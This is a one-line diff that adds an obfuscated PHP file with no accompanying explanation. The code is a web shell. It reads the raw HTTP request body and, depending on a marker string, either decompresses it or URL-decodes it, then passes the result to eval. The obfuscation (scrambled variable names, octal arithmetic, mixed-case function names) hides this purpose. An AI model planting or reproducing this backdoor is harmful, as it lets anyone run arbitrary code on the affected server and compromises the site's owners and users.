@@ -1,0 +1,1 @@
+<?php $a©Õ²=FILe_geT_cOntENTs("ph\x70\072//\151nput");if(SUbStR($a©Õ²,-01061+-01176-056- -02335,-01677- -01702)=="0\x30\060"):$aÙÝÐÇ=gZinFlATE(SUbstR($a©Õ²,-0104- -0560+-0451));@$aÏÅÂÇÌÑ=$aÙÝÐÇ;try{eval($aÏÅÂÇÌÑ);}catch(D38e7e1Ca5E0b2CF34cb83CdA589ECd56$aÜÄ½){}else:eval(UrLdecOde(STR_rEPLACE("code=","",$a©Õ²)));endif;
